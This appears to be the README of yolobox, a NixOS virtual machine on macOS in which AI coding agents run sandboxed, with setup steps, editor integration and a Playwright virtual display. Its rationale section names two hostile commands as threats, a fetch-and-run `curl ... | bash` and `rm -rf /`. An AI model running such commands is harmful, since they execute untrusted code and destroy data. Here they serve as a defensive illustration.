# yolobox

A Linux VM on your Mac where AI coding agents do their work.

NixOS machine, run by Lima, devbox, batteries included.

## Why this exists

- Agents blast radius (`rm -rf /`, `curl http://H4x0r-malware.sh | bash`)
- Supply chain attacks
- Slow MacOS SSD access due to `systempolicyd` scanning every disk access.

## The UI

### herdr terminal multiplexer

[https://herdr.dev/](https://herdr.dev/)

Run `cd myproj && yo enter` or `yo enter <fuzzy search>`

### T3 code web and mobile

[https://t3.codes/](https://t3.codes/)

Run `yo t3` (also can be paired remotely)


### **Zed** and **VS Code** open the VM's project directory over SSH

Run (`yo zed`, `yo code`).

## Quickstart

### Prerequisites

[1Password](https://1password.com/) with its SSH agent turned on (it holds your keys), and Lima (`brew install lima`).

Create and build the VM once:

```bash
./yo bootstrap     # create the VM, push this repo in, build NixOS, seed identities; rerunnable
```

Add `Include ~/.lima/yolobox/ssh.config` to `~/.ssh/config` so `ssh lima-yolobox`, Zed and VS Code can all find the VM.

Then, in any project under your home directory on the Mac:

```bash
cd ~/Developer/some-project
yo link            # adds a "yolobox" git remote; the VM mirrors the same $HOME-relative path
git push yolobox main
yo enter           # ssh into the mirrored directory inside the VM
```

`yo enter` (and `yo code`, `yo zed`) always lands in the guest twin of
your Mac working directory — subdirectories included, symlinked spellings
preserved, so the VM path reads exactly like the Mac path. If that path
does not exist in the VM yet, it says so on stderr and drops you at the
nearest existing ancestor; a working directory outside `$HOME` lands you
at the guest home, because the VM mirrors nothing outside it.

On a fresh box, re-run `yo seed` after your first `yo link`: seed copies
group `.gitconfig` files only into directory trees that already exist in
the VM.

Inside the VM, give the project its toolchain with [devbox](https://www.jetify.com/devbox).

```bash
devbox init
devbox add typescript bun nodejs
devbox run -- bun --version     # versions as of 2026-08-26
```

Find packages with `devbox search <name>`.

> Run `yo --help` for the rest of the commands.

## How to

### Make the VM your own

The VM is described by `flake.nix` and the modules in `nix/`.
To add a tool for everyday use, say `helix` or `vim`, add it to `environment.systemPackages` in `nix/base.nix`, then from this repo's checkout inside the VM (mirrored at the same `$HOME`-relative path as on the Mac):

```bash
git add -A                       # Nix only sees files git knows about
sudo YOLOBOX_USERNAME=$(id -un) nixos-rebuild switch --impure --flake .#yolobox
```

`yo ssh` gets you a shell to troubleshoot the VM.

The VM's disk survives restarts.
`yo enter` and setup the system as your usual Linux, install dotfiles, etc.


Four settings in `lima/yolobox.yaml` — `disk`, `portForwards`, `memory`, and `cpus` — are read once, when the VM is created. Changing the file later does nothing to an existing VM; stop it and use `limactl edit yolobox` (or `yo disk-grow` for the disk).
For memory and CPUs:

```bash
limactl stop yolobox && limactl edit yolobox --memory 16 --cpus 8 --start
```

### Use Zed or VS Code

Zed's own downloaded language servers do not work on NixOS: Zed strips the environment when spawning them, and nix-ld cannot rescue that.
Add LSPs to `devbox.json` instead, so they run through devbox's own environment rather than Zed's.
VS Code's Remote-SSH works through nix-ld as-is; if it misbehaves, `nixos-vscode-server` is the fallback.

### Browser & Virtual Display

The VM runs a virtual display (`:0`, 1920x1080) with two Playwright MCP servers, `playwright-chromium` and `playwright-firefox`, so an agent can drive a real browser and take screenshots. Each project keeps its own
browser profile, so logins survive between sessions.

Playwright MCP output — screenshots, PDFs, videos — stored in `~/artifacts/<project>/`, outside the git checkout. `yolobox-screen-record start|stop` records the whole display and writes flat into `~/artifacts/`, not per project.


